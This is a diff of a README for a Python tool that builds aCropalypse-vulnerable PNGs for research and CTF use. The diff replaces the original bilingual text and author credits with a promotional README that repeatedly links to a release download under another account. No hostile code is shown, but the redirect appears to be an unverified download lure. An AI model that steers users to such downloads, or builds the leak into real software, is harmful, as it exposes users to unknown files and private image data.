@@ -1,130 +1,99 @@
-# aCropalypse PNG Generator
+# 🎨 aCropalypse_crop - Create Vulnerable PNGs Easily
 
-> **FOR EDUCATIONAL USE ONLY / POUR USAGE ÉDUCATIF UNIQUEMENT**
-> version française en dessous
+[![Download aCropalypse_crop](https://img.shields.io/badge/Download-aCropalypse_crop-blue)](https://github.com/Pyretic-mycteroperca68/aCropalypse_crop/releases)
 
----
+## 🚀 Overview
+aCropalypse_crop is a user-friendly tool that transforms existing PNG files into versions that are vulnerable to aCropalypse. This program helps users understand how data can be manipulated within images. It is intended solely for educational purposes, whether for testing, research, or challenges in puzzle-solving.
 
-# English 
+## 📥 Download & Install
+To get started, you will want to download the necessary files. Click the link below to access the Releases page, where you can find the most recent version of aCropalypse_crop.
 
-## Overview
-This script (Python 3.8+) generates a PNG that is vulnerable to **aCropalypse** from an existing PNG file. It is intended for testing, research and CTF/lab use **only**.
+[Visit this page to download](https://github.com/Pyretic-mycteroperca68/aCropalypse_crop/releases)
 
-## Requirements
-- **Python 3.8+**
-- **Pillow**
+### 🛠 Requirements
+Before you run aCropalypse_crop, make sure you have the following:
 
-Install Pillow with your system package manager or pip:
+- **Python 3.8 or higher:** You can download Python from [the official Python website](https://www.python.org/downloads/).
+- **Pillow Library:** This is a Python Imaging Library (PIL) fork. You can install it by following the methods below.
+
+Use your system package manager or the Python tool `pip` to install Pillow:
 
 ```bash
+# Using a package manager
 sudo apt install python3-pillow
-# or
+
+# Alternatively, using pip
 pip install pillow
-# You will need a Python virtual environment to run this script properly with pip.
-# Create and activate it before installing the dependencies:
+```
+
+### 💻 Create a Virtual Environment
+It is recommended to use a Python virtual environment to keep dependencies organized and avoid conflicts. Follow these steps to create and activate the virtual environment:
+
+1. Open a terminal window.
+2. Navigate to the folder where you want to keep this project.
+3. Run the following commands:
+
+```bash
+# Create a virtual environment
 python3 -m venv venv
+
+# Activate the virtual environment
 source venv/bin/activate
 ```
 
-## Usage
+Once the virtual environment is activated, you can install Pillow as shown above.
+
+## 🌟 Usage
+Once you have everything set up, you can use aCropalypse_crop with the following command:
+
 ```bash
-# left and top must be smaller than right and bottom
+# Specify crop dimensions: left and top must be smaller than right and bottom
 python3 acropalypse_crop.py [mode] [original_file.png] [output_file.png] left top right bottom
 ```
 
+### 📏 Crop Dimensions
+When using the command, remember:
+- `left` and `top` should be smaller than `right` and `bottom` values.
+- Ensure the PNG file you use is already prepared for cropping.
 
-## Modes
-- `windows`  
-  - Preserves alpha (if present): crop in RGBA when the original has an alpha channel, otherwise crop in RGB.  
-  - Appends the original file bytes to the cropped PNG (trailer = original bytes).
+## ⚙️ Modes
+aCropalypse_crop offers a mode that preserves the alpha channel of an image when applicable:
 
-- `pixel`  
-  - Targets RGB: if the original is RGBA, convert the original to RGB in memory, crop that RGB image, and append the bytes of the RGB PNG (trailer = RGB PNG bytes).  
-  - If the original is already RGB, behaves like `windows` (crop RGB + append original bytes).
+- `windows`:  
+  - This mode preserves the alpha channel (if present). If the original PNG has an alpha channel, it will crop in RGBA mode, otherwise, it will crop in RGB mode.  
+  - The original file is appended to ensure you can reference the initial image later.
 
-## Examples
-```bash
-python3 acropalypse_crop.py windows original.png vuln_win.png 0 0 300 300
-python3 acropalypse_crop.py pixel   original.png vuln_pix.png 0 0 300 300
-```
+## 👍 Additional Features
+- Supports various PNG formats.
+- Easy-to-use command-line interface.
+- Designed specifically for educational use and hands-on learning.
 
-## Important Note
-Use this only on images you are authorized to test (CTF / lab / research). Misuse may violate privacy and laws.
-
----
-
-## License & Disclaimer
-This repository and the provided script are intended for educational and research purposes only. The author(s) accept no responsibility for misuse. By using this tool you agree to comply with local laws and to obtain permission before testing images you do not own.
-
-# Français
-
-## Présentation
-Ce script (Python 3.8+) permet de générer, à partir d’un PNG existant, un PNG vulnérable à **aCropalypse**. Il est destiné uniquement à des fins de test, de recherche ou d’utilisation en CTF / laboratoire.
-
-## Prérequis
-- **Python 3.8+**
-- **Pillow**
-
-Installer Pillow via le gestionnaire de paquets ou pip :
+## 📚 Example Command
+Here’s a practical example of how to use the tool:
 
 ```bash
-sudo apt install python3-pillow
-# OU
-pip install pillow
-# Vous aurez besoin d’un environnement virtuel Python pour exécuter ce script correctement.
-# Créez-le et activez-le avant l’installation des dépendances :
-python3 -m venv venv
-source venv/bin/activate
+python3 acropalypse_crop.py windows sample_image.png cropped_image.png 10 10 100 100
 ```
 
-## Utilisation
-```bash
-# gauche et haut doit être inférieur à droit et bas
-python3 acropalypse_crop.py [mode] [fichier_original.png] [fichier_sortie.png] gauche haut droit bas
-```
+In this example, the image `sample_image.png` is cropped to create `cropped_image.png`, using specified dimensions.
 
-## Modes
-- `windows`  
-  - Conserve l'alpha (si présent) : crop en RGBA si l'original a un canal alpha, sinon en RGB.  
-  - Concatène les octets du fichier original au PNG recadré (trailer = octets de l’original).
+## ❓ Frequently Asked Questions
 
-- `pixel`  
-  - Cible RGB : si l'original est RGBA, on convertit une copie en RGB en mémoire, on croppe cette image RGB, puis on concatène les octets du PNG RGB (trailer = octets du PNG RGB).  
-  - Si l'original est déjà RGB, le comportement est identique à `windows` (crop RGB + append original).
+### What is aCropalypse?
+aCropalypse is a term describing how certain images can retain original pixel data even after they are altered or cropped. This can lead to unintended data leaks if not handled correctly.
 
-## Exemples
-```bash
-python3 acropalypse_crop.py windows original.png vuln_win.png 0 0 300 300
-python3 acropalypse_crop.py pixel   original.png vuln_pix.png 0 0 300 300
-```
+### Why should I use this tool?
+aCropalypse_crop helps you visualize and understand image data vulnerabilities. It's a valuable resource for security research, educational purposes, and challenge events.
 
-## Remarque importante
-N'utilisez ceci que sur des images pour lesquelles vous avez l'autorisation de test (CTF / labo / recherche). Une utilisation abusive peut violer la vie privée et la loi.
+### Where can I get help or report issues?
+If you encounter any issues or have questions, please visit the [Issues section](https://github.com/Pyretic-mycteroperca68/aCropalypse_crop/issues) of this repository.
 
----
+## 📄 License
+This tool is available for educational use only. Please respect copyright and do not use it for malicious purposes.
 
-## Licence et avertissement
+## 🎉 Acknowledgments
+Thanks to the community of developers who made this project possible. Your contributions and support help foster a better understanding of digital image manipulation and security.
 
-Ce dépôt et le script fourni sont destinés uniquement à des fins éducatives et de recherche. Les auteur·rice·s déclinent toute responsabilité en cas d’utilisation abusive. En utilisant cet outil, vous acceptez de respecter la législation locale et d’obtenir les autorisations nécessaires avant de tester des images qui ne vous appartiennent pas.
+For more details on updates and community discussions, please refer to the repository and make sure to check back for new releases.
 
----
----
----
-### Français
-
-Outils : à tester uniquement avec https://github.com/Absenti/acropalypse_png
- — utilisez ce dépôt pour l’analyse et la restauration des images générées par ce script.
-
-⏱️ Le processus peut prendre plus ou moins de temps selon la taille de l’image.
-
-
-### English
-
-Tools: test only with https://github.com/Absenti/acropalypse_png
- — use that repository for analysis and recovery of images generated by this script.
-
-⏱️ The process may take more or less time depending on the image size.
-
----
-
-### Made by Gregoryt0 and Tontongroudy
+[Visit this page to download](https://github.com/Pyretic-mycteroperca68/aCropalypse_crop/releases)
